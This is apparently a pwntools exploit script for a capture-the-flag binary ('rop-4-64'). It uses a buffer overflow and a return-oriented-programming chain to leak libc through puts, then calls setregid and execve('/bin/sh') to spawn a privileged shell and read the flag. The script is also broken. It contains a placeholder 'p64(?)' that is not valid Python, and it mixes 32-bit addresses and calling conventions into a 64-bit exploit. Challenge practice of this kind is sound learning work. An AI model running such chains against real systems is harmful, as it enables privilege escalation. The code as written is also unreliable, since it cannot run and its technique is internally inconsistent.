from pwn import *
import os

DEBUG = False 
file = "./rop-4-64"
env = {"PATH":"$PATH:."}

elf = ELF(file)
libc = elf.libc
max_len = 0x136

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug(file, env=env, gdbscript='''
b *input_func
continue
''')

else:
    io = process(file, env=env)


# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE

got_read = p64(?)
puts = p64(elf.symbols["puts"])
input_func = p64(elf.symbols["input_func"])

payload = flat (
    b"A" * max_len,
    puts,
    input_func,
    got_read
)

io.sendline(payload)
io.recvuntil(b'\n!\n')


libc_read = u64(io.recvline()[0:4])
libc_address = libc_read - libc.symbols["read"]

libc.address = libc_address

print("libc_address", libc.address)

setregid = libc.symbols["setregid"]
print("setregid", hex(setregid))

execve = libc.symbols["execve"]
pop2 = p64(0x0804873a)
binsh = next(libc.search(b'/bin/sh'))
print(hex(binsh))

payload = flat (
    b"A" * max_len,
    setregid,
    pop2,
    p64(50006),
    p64(50006),
    execve,
    b"A" * 4,
    binsh,
    p64(0),
    p64(0),
)
io.sendline(payload)

io.interactive()

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

# import re
# io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
# flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
# print(flag)
